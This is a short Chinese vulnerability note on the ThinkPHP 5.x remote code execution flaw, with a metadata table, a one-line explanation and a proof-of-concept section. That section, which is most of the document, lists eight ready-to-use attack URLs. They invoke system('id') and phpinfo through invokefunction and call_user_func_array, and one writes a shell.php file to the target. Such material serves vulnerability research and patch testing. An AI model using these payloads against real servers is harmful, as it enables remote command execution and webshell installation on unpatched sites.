### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|thinkphp5框架缺陷导致远程代码执行|2018-10-10|unknown|[http://www.thinkphp.cn/](http://www.thinkphp.cn/) | [下载连接](http://www.thinkphp.cn/down.html) |5.x < 5.1.31, <= 5.0.23| [详情](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)|  

#### 漏洞概述  

> 由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞   
> 
### poc

```html
http://192.168.99.98:7878/?s=index/\think\Request/input&filter=phpinfo&data=1
http://192.168.99.98:7878/?s=index/\think\Request/input&filter=system&data=id
http://192.168.99.98:7878/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
http://192.168.99.98:7878/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
http://192.168.99.98:7878/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://192.168.99.98:7878/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```